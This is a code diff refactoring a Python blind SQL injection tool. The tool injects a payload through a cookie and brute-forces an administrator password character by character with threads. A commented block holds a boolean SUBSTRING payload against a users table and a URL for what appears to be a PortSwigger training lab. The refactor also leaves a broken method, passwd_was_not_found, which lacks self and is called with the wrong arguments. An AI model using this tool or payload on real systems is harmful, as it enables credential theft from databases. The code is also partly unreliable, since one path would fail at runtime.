@@ -4,6 +4,7 @@ import datetime
 import http.client
 import json
 import sys
+import time
 from collections import OrderedDict
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
@@ -19,12 +20,11 @@ from rich.panel import Panel
 from SQLInjector.brute_forcer import BruteForcer
 from SQLInjector.cookie_injector_core import CookieInjector
 
-c = Console()
 # url = "https://0a6c002f031d991d81c225db00ea0044.web-security-academy.net/product?productId=13"
 #
-# code_to_inject = ("""
-# ' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--
-# """,)[0]
+# code_to_inject = (
+#     "' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--",
+# )[0]
 #
 # password_length = 20
 # payload_character_set = [letter for letter in string.ascii_letters] + [num for num in range(0, 10)]
@@ -33,6 +33,8 @@ c = Console()
 
 # threads = 20
 # queues = [Queue() for queue in range(threads)]
+
+c = Console()
 
 
 class Injector:
@@ -45,7 +47,7 @@ class Injector:
         self.char_set = char_set
         self.inject_code = inject_code
         self.max_threads = max_threads
-        self.queues = [Queue() for queue in range(self.max_threads)]
+        self.queues = [Queue() for _queue in range(self.max_threads)]
         self.found_characters = {}
         self.discard_seq_num = []
         self.debug_skipped = []
@@ -104,13 +106,13 @@ class StartInjector:
     def load_config(self, config_file_path: Path) -> dict:
         try:
             with open(config_file_path, "r") as config_file:
-                return json.load(config_file)
+                return dict(json.load(config_file))
         except FileNotFoundError:
             self.run_cookie_injector_setup()
             with open(config_file_path, "r") as config_file:
-                return json.load(config_file)
+                return dict(json.load(config_file))
 
-    def initialize_data(self, config):
+    def initialize_data(self, config: dict) -> tuple:
         target_url = config.get("target_url")
         confirm_string = config.get("confirm_string").encode()
         cookie_name = config.get("cookie_name")
@@ -120,17 +122,20 @@ class StartInjector:
         max_threads = int(config.get("max_threads"))
         return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
 
-    def print_config_file(self, config_file_path):
-        with open(config_file_path, "r") as config_file:
-            config_file_content = json.loads(config_file.read())
+    def print_config_file(self, config_file_path: Path, set_url: str) -> None:
+        config_file_content = self.load_config(config_file_path)
         print()
-        c.print(config_file_content)
+        if not set_url:
+            c.print(Markdown(f"**Using data from configuration file...**"))
+            print()
+        c.print(Markdown(f"# Configuration File Content"))
+        c.print(config_file_content, style="black")
 
-    def run_cookie_injector_setup(self):
+    def run_cookie_injector_setup(self) -> None:
         from SQLInjector import cookie_injector_setup
         cookie_injector_setup.main()
 
-    def thread_pool_executor(self, max_threads, injector, passwd_length, start_time):
+    def thread_pool_executor(self, max_threads: int, injector: Injector, passwd_length: int, start_time: time) -> None:
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             for thread_id, working_queue in enumerate(injector.queues):
                 while not working_queue.empty():
@@ -147,44 +152,61 @@ class StartInjector:
                     else:
                         break
 
-    def process_passwd_data(self, injector_obj, start_time, out_file):
+    def process_char_dict(self, injector_obj: Injector) -> str:
         found_characters = injector_obj.found_characters
         ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
         clear_text_passwd = ""
         for k, v in ordered_passwd_dict.items():
             clear_text_passwd += str(v)
+        return clear_text_passwd
+
+    def passwd_was_found(self, clear_text_passwd, out_file):
+        message = f"Password successfully brute forced: {clear_text_passwd}"
+        c.print(message, style="green")
+        if out_file:
+            with open(out_file, "w") as output_file:
+                output_file.write(message)
+            c.print(f"Output file '{out_file}' created successfully.")
+
+    def passwd_was_not_found(clear_text_passwd, out_file):
+        message = f"No password recovered."
+        c.print(message, style="red")
+        if out_file:
+            with open(out_file, "w") as output_file:
+                output_file.write(message)
+            c.print(f"Output file '{out_file}' created successfully.")
+
+    def process_runtime(self, start_time):
         end_time = datetime.datetime.now()
         run_time = end_time - start_time
+        return run_time, end_time
+
+    def process_passwd_data(self, injector_obj: Injector, start_time: time, out_file: Path) -> None:
+        clear_text_passwd = self.process_char_dict(injector_obj)
+        run_time, end_time = self.process_runtime(start_time)
         if len(clear_text_passwd) >= 1:
-            message = f"Password successfully brute forced: {clear_text_passwd}"
-            c.print(message, style="green")
-            if out_file:
-                with open(out_file, "w") as output_file:
-                    output_file.write(message)
-                c.print(f"Output file '{out_file}' created successfully.")
+            self.passwd_was_found(clear_text_passwd, out_file)
         else:
-            message = f"No password recovered."
-            c.print(message, style="red")
-            if out_file:
-                with open(out_file, "w") as output_file:
-                    output_file.write(message)
-                c.print(f"Output file '{out_file}' created successfully.")
+            self.passwd_was_not_found(out_file)
         c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")
 
     def process_options(self, set_url, config_file_path, setup_utility):
         if setup_utility:
             self.run_cookie_injector_setup()
         config = self.load_config(config_file_path)
-        (
-            target_url, confirm_string, cookie_name,
-            passwd_length, char_set, inject_code,
-            max_threads
-        ) = self.initialize_data(
-            config)
         if set_url:
-            target_url = set_url
-            c.print(f"Target URL: {target_url}")
-        return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
+            config["target_url"] = set_url
+            print()
+            c.print(Markdown(f"\n**Using custom URL...**\n- Target URL: {config.get("target_url")}"))
+        return self.initialize_data(config)
+
+        # (
+        #     target_url, confirm_string, cookie_name,
+        #     passwd_length, char_set, inject_code,
+        #     max_threads
+        # ) = self.initialize_data(
+        #     config)
+        # return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
 
     def kill_all_threads(self):
         for future in self.futures:
@@ -196,7 +218,7 @@ class StartInjector:
             target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = (
                 self.process_options(set_url, config_file_path, setup_utility)
             )
-            self.print_config_file(config_file_path)
+            self.print_config_file(config_file_path, set_url)
             injector = Injector(
                 target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
             )
@@ -204,7 +226,7 @@ class StartInjector:
             c.print(f"Start time {start_time}.", style="blue")
             injector.check_url()
             injector.brute_forcer()
-            c.print(Markdown("# Brute forcing password.."))
+            c.print(Markdown("# Brute forcing password..."))
             self.thread_pool_executor(max_threads, injector, passwd_length, start_time)
             self.process_passwd_data(injector, start_time, out_file)
         except KeyboardInterrupt:
